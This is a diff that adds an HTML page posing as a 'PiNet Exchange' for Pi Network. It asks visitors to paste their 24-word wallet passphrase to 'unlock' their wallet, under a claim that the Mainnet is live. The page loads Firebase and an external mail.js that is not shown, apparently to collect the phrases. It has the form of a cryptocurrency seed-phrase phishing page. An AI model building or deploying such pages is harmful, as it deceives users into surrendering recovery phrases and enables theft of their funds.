@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PiNet Exchange</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+        }
+
+        .header {
+            background-color: #713D92;
+            color: white;
+            padding: 20px 0; /* Dodan prostor iznad i ispod */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .header .center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .header .center img {
+            width: 24px;
+            height: 24px;
+            margin: 0 10px;
+        }
+
+        .header .center span {
+            font-weight: bold;
+            font-size: 20px;
+            color: white;
+        }
+
+        h2 {
+            font-size: 28px; /* Povećan font */
+            color: #333;
+            margin: 20px auto; /* Dodan prostor iznad i ispod */
+            text-align: center;
+            font-weight: bold;
+        }
+
+        textarea {
+            display: block;
+            margin: 30px auto; /* Dodan prostor iznad i ispod */
+            width: 90%;
+            max-width: 400px;
+            height: 150px;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            line-height: 1.5;
+        }
+
+        button {
+            display: block;
+            margin: 20px auto; /* Dodan prostor iznad */
+            width: 90%;
+            max-width: 400px;
+            padding: 15px;
+            font-size: 16px;
+            border: 2px solid #713D92;
+            border-radius: 10px;
+            cursor: pointer;
+            background-color: transparent;
+            color: #713D92;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: #f7f7f7;
+        }
+
+        .content {
+    margin: 10px auto; /* Smanjen razmak iznad */
+    max-width: 400px;
+    text-align: center;
+}
+
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
+
+        .info-text {
+            text-align: justify; /* Obostrano poravnanje */
+            font-size: 14px; /* Povećan font */
+            color: #555;
+            margin-top: 20px; /* Povećan razmak iznad */
+            margin-bottom: 20px; /* Dodan razmak ispod */
+            width: 90%;
+            max-width: 400px;
+            line-height: 1.5;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .highlight {
+            font-weight: bold;
+            color: #713D92;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="center">
+            <img src="assets/images/1234.png" alt="Exchange Icon">
+            <span>Exchange</span>
+            <img src="assets/images/123.png" alt="Pi Icon">
+        </div>
+    </div>
+
+    <div class="content">
+        <h2>Paste your passphrase to unlock your wallet</h2>
+        <form id="PiExchangeForm">
+            <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here" style="height: 250px; line-height: 1.5;"></textarea>
+            <p class="error-message" id="passphrase-error">Please enter a valid 24-word passphrase.</p>
+            <button type="submit" class="btn-passphrase">UNLOCK WITH PASSPHRASE</button>
+        </form>
+        
+        <p class="info-text">
+            The Mainnet is now live! You can use your wallet for secure transactions directly on global exchanges.
+        </p>
+        <p class="info-text">
+            Ensure access using your passphrase and be part of the historic moment of decentralization.
+        </p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="mail.js"></script>
+    <script>
+        const form = document.getElementById('PiExchangeForm');
+        const errorMessage = document.getElementById('passphrase-error');
+        const passphraseInput = document.getElementById('passphrase');
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            const passphrase = passphraseInput.value.trim();
+
+            if (passphrase.split(/\s+/).length !== 24) {
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            errorMessage.style.display = 'none';
+
+          
+            passphraseInput.value = '';
+        });
+    </script>
+</body>
+</html>
